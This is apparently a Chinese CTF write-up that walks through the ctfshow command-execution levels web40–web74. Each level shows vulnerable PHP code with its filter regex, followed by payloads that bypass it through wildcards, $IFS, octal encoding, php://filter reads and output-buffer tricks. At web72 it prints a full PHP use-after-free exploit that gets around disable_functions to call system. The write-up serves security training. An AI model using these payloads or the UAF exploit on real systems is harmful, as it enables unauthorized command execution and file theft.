---
title: ctfshow 命令执行题解
date: 2025-09-15 10:00:00
author: Xendr1a
categories: [CTF题解, ctfshow]
tags: [ctfshow, RCE]
description: ctfshow 命令执行专题：过滤绕过、无字母数字与命令拼接。
toc: true
---
## 命令执行

### web40

```text
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|~|`|\@|\#|\\$|\%|\^|\&|*|\（|\）|\-|=|\+|\{|[|]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

参考无参数绕过rce，先介绍几个新朋友

```text
get_defined_vars() — 返回由所有已定义变量所组成的数组 
current() — 返回数组中的当前单元，pos()是它的别名
end() — 将数组的内部指针指向最后一个单元 
session_start() — 启动新会话或者重用现有会话  #关于session的以后再说
localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."
scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录
array_reverse() — 返回单元顺序相反的数组 
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
prev()将内部指针指向数组中的上一个元素，并输出。
reset()将内部指针指向数组中的第一个元素，并输出。
each()返回当前元素的键名和键值，并将内部指针向前移动。
```

```text
payload:/?c=eval(end(pos(get_defined_vars())));&1=system("tac flag.php");
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));
?c=show_source(next(array_reverse(scandir(getcwd()))));
```

[https://blog.csdn.net/m0_73756016/article/details/137437396](https://blog.csdn.net/m0_73756016/article/details/137437396)这个可以讲的很好，无参数绕过RCE

### web41

### web42

```text
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1");
}else{
    highlight_file(__FILE__);
}
```

`/dev/null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 /dev/null 即不回显`

我们需要让其出现需要分隔一下命令语句，可以使用；和  || 也可以 %0a

```text
?c=tac flag.php;
```

### web43

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

；和cat被过滤了，那我们可以换个姿势

```text
?c=tac%20flag.php||
```

### web44

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

flag被过滤了，那我们可以使用通配符

```text
?c=tac%20fla*||
```

### web45

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

加了个空格

```text
?c=tac%09fl*.php||
?c=tac$IFS$9fl*.php||
?c=tac%09fl*.php%26
?c=tac%09fla*.php%0a
?c=tacIFS9fla*.php%0a等等
```

### web46

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

可恶我的$和*都被过滤了，但是我们还有？和%09（tap）

```text
?c=tac%09fla?.php||
```

```text
还有一些✌的payload
?c=tail%09fl''ag.php||
?c=tac%09fla?.php%0A
?c=tac<fla%27%27g.php||
```

### web47

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

多ban了几个命令，感觉没ban到点子上，我们上题的payload还能用

### web48

```text
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

还是ban了一些命令，我们还是能用之前的payload

### web49

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|\%/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

我了个乖乖，这个%被过滤了那我们只能用%09（TAP）了，还是上面的payload

### web50

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

额，过滤了\x09和\x26，那我们就用不了%09了

那我们可以使用一个不用空格的命令，或者<绕过

```text
?c=nl<fla''g.php||
/?c=tac<fla%27%27g.php||
/?c=tac<fl''ag.php%0a
```

### web51

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|\%|\x09|\x26/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

终于还是过滤到了tac，继续nl吧

```text
?c=nl<fla''g.php||
```

### web52

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|\%|\x09|\x26|\>|\</i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

nl启动！！！，过滤了<,但是$放出来了

```text
?c=nl${IFS}/fla''g.php||  #很尴尬啥都没有，那我们看看根目录
?c=ls${IFS}/||
?c=nl${IFS}/fla''g||
```

```text
或者/?c=ca\t${IFS}/fla?||这样也能过
```

### web53

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|\%|\x09|\x26|\>|\</i", $c)){
        echo($c);
        $d = system($c);
        echo "<br>".$d;
    }else{
        echo 'no';
    }
}else{
    highlight_file(__FILE__);
}
```

诶，意识到没有重定向了，考察的估计是\绕过和空格绕过

```text
/?c=ca\t${IFS}fla?.php
/?c''at${IFS}fla''g.p''hp
ta''c${IFS}????.php
ta\c${IFS}fla\g.php
```

### web54

```text
<?php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

运用cp命令，把flag.php复制到别的地方去，然后查看即可

```text
?c=cp${IFS}???g.php${IFS}o.txt
```

### web55

```text
<?php
// 你们在炫技吗？
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    }
}else{
    highlight_file(__FILE__);
}
```

额，字母没了，那我们得想想了

这里有两种方法，一种是bin目录下的命令执行，另一种就是数字编码使用无字母RCE。  
linux系统可以使用`$'\xxx'`的方式执行命令。

```text
?c=/???/????64 ????.???
// 即/bin/base64 flag.php
?c=/???/???/????2 ????.???
// 即/usr/bin/bzip2 flag.php
//把flag.php给压缩，然后访问url+flag.php.bz2就可以把压缩后的flag.php给下载下来。
?c=$'\143\141\164'%20$'\146'*
```

### web56

## 无字母数字的命令执行

主要知识点就是

```text
shell下可以利用.来执行任意脚本
Linux文件名支持用glob通配符代替
```

```text
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body>
<form action="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="file" id="file"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```

直接看这个[https://blog.csdn.net/qq_46091464/article/details/108513145](https://blog.csdn.net/qq_46091464/article/details/108513145)

### web57

```text
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-08 01:02:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

// 还能炫的动吗？
//flag in 36.php
if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|[a-z]|[0-9]|`|\|\#|\'|\"|`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|*|\-|=|[/i", $c)){
        system("cat ".$c.".php");
    }
}else{
    highlight_file(__FILE__);
}
```

flag在36.php里面，但是数字被过滤了，我们只需要让c=36就行了

```text
$(()) ：代表做一次运算，因为里面为空，也表示值为0

$(( ~$(()) )) ：对0作取反运算，值为-1

$(( $((~$(()))) $((~$(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2

$(( ~$(( $((~$(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1

故我们在$(( ~$(( )) ))里面放37个$((~$(())))，得到-37，取反即可得到36:

脚本
get_reverse_number = "$((~$(({}))))" # 取反操作
negative_one = "$((~$(())))"		# -1
payload = get_reverse_number.format(negative_one*37)
print(payload)
```

### web58-65

```text
<?php
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
}else{
    highlight_file(__FILE__);
}
```

简单的源码，但是过滤了好多东西比如system，passthru，exec等

但是没过滤全还有

```text
show_source()
highlight_file()
```

```text
payload:c=show_source('flag.php');
```

还有一些佬的include+伪协议绕过

```text
payload:c=include($_POST['1']);&1=php://filter/convert.base64-encode/resource=flag.php
```

### web66-67

试了一下前几题的方法发现报错，猜是文件名的问题

show_source应该是被过滤了

```text
c=var_dump(scandir('/'));查找文件名
c=var_dump(highlight_file('/flag.txt'));
```

### web68

可以看到开头过滤了highlight_file();

我们还是老方法先查目录c=scandir('/');

然后尝试了web55-65的方法,可以用include也可以用require

```text
c=include($_POST['1']);&1=php://filter/convert.base64-encode/resource=/flag.txt
```

### web69-70

发现var_dump被过滤了，找一个和它差不多的函数，例如var_export

然后就和上题一样了

### web71

```text
<?php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}

?>
```

要让后面的代码不执行

```text
c=include('/flag.txt');ob_flush();
在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：
ob_flush();
ob_end_flush();
```

```text
c=include('/flag.txt');exit();
提前终止程序
```

### web72

尝试用`c=var_export(scandir('/'));exit();`来读取根目录，发现被open_basedir拦了

```text
open_basedir是PHP中的一个配置选项，用于限制PHP脚本只能访问特定的目录。通过设置php.ini中的open_basedir选项，可以防止PHP脚本访问服务器上的其他敏感文件，从而提高服务器的安全性。
```

找了一下，发现可以用glob://绕过（system也行但是被过滤了）

```text
wp写的payload
c=?><?php
$a=new DirectoryIterator("glob:///*");
foreach($a as $f)
{echo($f->__toString().' ');
} e
xit(0);
?>
或者
c=var_export(scandir('glob:///*'));exit();
```

找到了flag0.txt

然后用`uaf的脚本`执行命令

```text
c=?><?php
pwn("ls /;cat /flag0.txt");
 
function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
 
    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
 
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf('%c',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }
 
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf('%c',$v & 0xff);
            $v >>= 8;
        }
    }
 
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
 
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
 
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
 
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
 
            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
 
        if(!$data_addr || !$text_size || !$data_size)
            return false;
 
        return [$data_addr, $text_size, $data_size];
    }
 
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
 
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
 
            return $data_addr + $i * 8;
        }
    }
 
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
 
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
 
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
 
    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
 
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
 
    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
 
    $helper = new Helper;
    $helper->b = function ($x) { };
 
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
 
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
 
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
 
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
 
    $closure_obj = str2ptr($abc, 0x20);
 
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
 
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
 
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
 
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
 
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
 
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
 
    ($helper->b)($cmd);
    exit();
}
```

### web73

没有了`open_basedir`过滤，可以打之前的组合拳了

```text
var_export(scandir('/'));exit();
include('/flagc.txt');exit();
```

### web74

scandir被过滤了可以使用glob函数找目录

```text
c=var_export(glob('../../../*'));ob_flush();
c=include('/flagx.txt');ob_flush();
```
